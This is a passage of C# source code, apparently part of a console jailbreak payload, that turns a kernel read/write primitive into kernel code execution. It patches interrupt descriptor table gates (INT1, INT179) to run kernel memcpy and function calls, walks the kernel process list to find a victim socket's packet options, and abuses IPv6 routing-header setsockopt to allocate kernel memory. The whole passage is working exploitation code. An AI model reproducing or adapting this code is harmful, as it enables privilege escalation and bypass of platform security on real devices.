            PayloadCrt.Klog("sp:kfn:call:getpid:ok\n\0"u8);
        }

        // Patch IDT[179] for kmemcpy, IDT[9] for RunInKernel (if needed).
        fixed (byte* g179 = s_idt179Gate)
            io.Write(s_idtBase + 179 * 16, g179, 16);

        // Copy uretframe_for_trace to kernel uretframe via kmemcpy (INT 179).
        fixed (ulong* urf = s_uretframeForTrace)
            CrtKmemcpy((void*)s_uretframeKva, urf, 40);

        // Restore IDT[179].
        fixed (byte* og179 = s_origIdt179Gate)
            io.Write(s_idtBase + 179 * 16, og179, 16);

        // Patch IDT[1] for the trace cycle. Must be done HERE (not in Setup)
        // because stray INT1 between Setup() and Call() would enter the trace
        // handler which corrupts registers (add_rsp_iret skips 8 bytes from
        // the standard INT1 frame, misaligning RIP/CS/EFLAGS/RSP/SS).
        fixed (byte* g = s_idt1Gate)
            io.Write(s_idtBase + 1 * 16, g, 16);

        // Set TF and immediately syscall(getpid) in ONE CRT function.
        CrtSetTfAndGetpid();

        // Restore original IDT[1] immediately after the trace completes,
        // BEFORE any managed code runs — prevents stray INT1 corruption.
        fixed (byte* g = s_origIdt1Gate)
            io.Write(s_idtBase + 1 * 16, g, 16);

        // Clear trace callback.
        CrtTraceSetProg(0);

        // Read the result from CRT BSS (set by __sp_getpid_to_fncall).
        return CrtGetFncallAns();
    }

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_get_clear_tf_handler")]
    private static partial nint CrtGetClearTfHandler();

    /// <summary>Sets EFLAGS.TF (Trap Flag) to enable single-step tracing.</summary>
    private static void EnableTf()
    {
        // pushfq; or byte [rsp+1], 1; popfq — sets bit 8 of EFLAGS.
        // This is done as inline-equivalent via the CRT set_trace or directly.
        // Since C# cannot do inline asm, we use the run_in_kernel CRT function
        // with a nop_ret target and TF already set in the regs struct.
        // Actually, we use a simpler approach: set TF via signal context.
        // Inline-assembly pattern: pop rax; pushfq; or byte [rsp+1], 1; popfq; push rax;
        CrtSetTf();
    }

    // ---- Helpers ----

    private static ulong Abs(ulong kdb, long offset) => kdb + unchecked((ulong)offset);

    private static ulong FindVictimPktopts(PayloadKernelIo io, PayloadArgs* pargs, int victimFd)
    {
        int ourPid = Process.PayloadProcessControl.getpid();
        ulong proc = PayloadKernel.WalkAllprocForPid(io, ourPid);
        if (proc == 0) return 0;

        ulong filedesc = io.ReadU64(proc + KernelOffsets.ProcFd);
        if (filedesc == 0) return 0;

        ulong ofiles = io.ReadU64(filedesc + FdOfilesOffset);
        if (ofiles == 0) return 0;

        ulong victimFile = io.ReadU64(ofiles + FdEntryBase + (ulong)victimFd * FdEntryStride);
        if (victimFile == 0) return 0;

        ulong victimSock = io.ReadU64(victimFile + FileDataOffset);
        if (victimSock == 0) return 0;

        ulong inpcb = io.ReadU64(victimSock + SocketPcbOffset);
        if (inpcb == 0) return 0;

        return io.ReadU64(inpcb + InpcbOutputoptsOffset);
    }

    private static ulong KmallocViaRthdr(PayloadKernelIo io, int victimFd, ulong pktopts, int size)
    {
        if (size > 2048) return 0;
        if (size < 32) size = 32;

        io.WriteU64(pktopts + 0x70, 0);
        io.WriteU64(pktopts + 0x78, 0);

        int rthdrLen = ((size / 8) - 1) & ~1;
        int allocSz = (rthdrLen + 1) * 8;
        byte* rthdr = stackalloc byte[allocSz];
        new System.Span<byte>(rthdr, allocSz).Clear();
        rthdr[1] = (byte)rthdrLen;
        rthdr[3] = (byte)(rthdrLen / 2);

        long rc = PayloadCrt.Syscall(SysSetsockopt, victimFd,
            IpprotoIpv6, Ipv6Rthdr, (long)(nint)rthdr, allocSz);
        if (rc != 0) return 0;

        ulong addr = io.ReadU64(pktopts + 0x70);
        io.WriteU64(pktopts + 0x70, 0);
        io.WriteU64(pktopts + 0x78, 0);
        return addr;
    }

    private static void BuildIdtGate(byte* gate, ulong handler, ushort selector, byte ist, byte typeAttr)
    {
        new System.Span<byte>(gate, 16).Clear();
        gate[0] = (byte)(handler & 0xFF);
        gate[1] = (byte)((handler >> 8) & 0xFF);
        gate[2] = (byte)(selector & 0xFF);
        gate[3] = (byte)((selector >> 8) & 0xFF);
        gate[4] = ist;
        gate[5] = typeAttr;
        gate[6] = (byte)((handler >> 16) & 0xFF);
        gate[7] = (byte)((handler >> 24) & 0xFF);
        gate[8] = (byte)((handler >> 32) & 0xFF);
        gate[9] = (byte)((handler >> 40) & 0xFF);
        gate[10] = (byte)((handler >> 48) & 0xFF);
        gate[11] = (byte)((handler >> 56) & 0xFF);
    }

    // ---- CRT P/Invokes ----

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_kmemcpy")]
    private static partial void CrtKmemcpy(void* dst, void* src, ulong count);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_crt_syscall")]
    private static partial long CrtSyscall(int sysno);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_set_tf")]
    private static partial void CrtSetTf();

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_set_tf_and_getpid")]
    private static partial void CrtSetTfAndGetpid();

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_run_in_kernel")]
    private static partial void CrtRunInKernel(RunInKernelRegs* regs);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_trace_init")]
    private static partial void CrtTraceInit(ulong kframe, ulong uretframe,
        ulong traceStart, ulong traceEnd, nint traceProg, ulong traceFrameSize);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_trace_set_prog")]
    private static partial void CrtTraceSetProg(nint traceProg);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_get_ret2trace")]
    private static partial nint CrtGetRet2trace();

    /// <summary>Returns the address of the <c>.int1_return</c> label inside
    /// <c>__sp_run_in_kernel</c>. Used to pre-seed the kernel uretframe with a
    /// valid user-mode return address so the IRETQ from single-step lands at
    /// the CRT's register-restore epilogue rather than at slab residue.</summary>
    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_get_int1_return")]
    private static partial nint CrtGetInt1Return();

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_pipe")]
    private static partial void CrtPipe(int* fds);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_pipe_reinit")]
    private static partial void CrtPipeReinit(ulong pipeAddr, int pipeRead, int pipeWrite);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_fncall_init")]
    private static partial void CrtFncallInit(ulong cpuSwitch, ulong sysGetpid,
        ulong syscallAfter, ulong fncallFn, ulong arg0, ulong arg1,
        ulong arg2, ulong arg3, ulong arg4, ulong arg5,
        ulong ans, ulong nopRet, ulong doretiIret);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_fncall_init_core")]
    private static partial void CrtFncallInitCore(ulong cpuSwitch, ulong sysGetpid,
        ulong syscallAfter, ulong nopRet, ulong doretiIret);

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_get_fncall_callback")]
    private static partial nint CrtGetFncallCallback();

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_get_fncall_ans")]
    private static partial ulong CrtGetFncallAns();

    [SuppressGCTransition]
    [LibraryImport("libScePosix", EntryPoint = "__sp_set_fncall_args")]
    private static partial void CrtSetFncallArgs(ulong fn, ulong a0, ulong a1,
        ulong a2, ulong a3, ulong a4, ulong a5);

    /// <summary>
    /// Register state passed to <c>run_in_kernel</c>. Matches the on-device trap-frame layout.
    /// </summary>
    [StructLayout(LayoutKind.Sequential)]
    private struct RunInKernelRegs
    {
        public ulong rax, rbx, rcx, rdx, rsi, rdi;
        public ulong rbp, rsp;
        public ulong r8, r9, r10, r11, r12, r13, r14, r15;
        public ulong rip;
        public ulong eflags;
    }

    /// <summary>
    /// The original IDT[1] handler address, saved before trace setup patches IDT[1].
    /// Exposed so <see cref="KernelModuleInstaller"/> can pass it to the kelf as
    /// the <c>int1_handler</c> symbol instead of reading the (now-patched) IDT.
    /// </summary>
    internal static ulong OriginalInt1Handler { get; private set; }

    /// <summary>
    /// The original IDT[3] handler address, saved before trace setup.
    /// </summary>
    internal static ulong OriginalInt3Handler { get; private set; }

    /// <summary>
    /// The original IDT[13] handler address, saved before trace setup.
    /// </summary>
    internal static ulong OriginalInt13Handler { get; private set; }
}
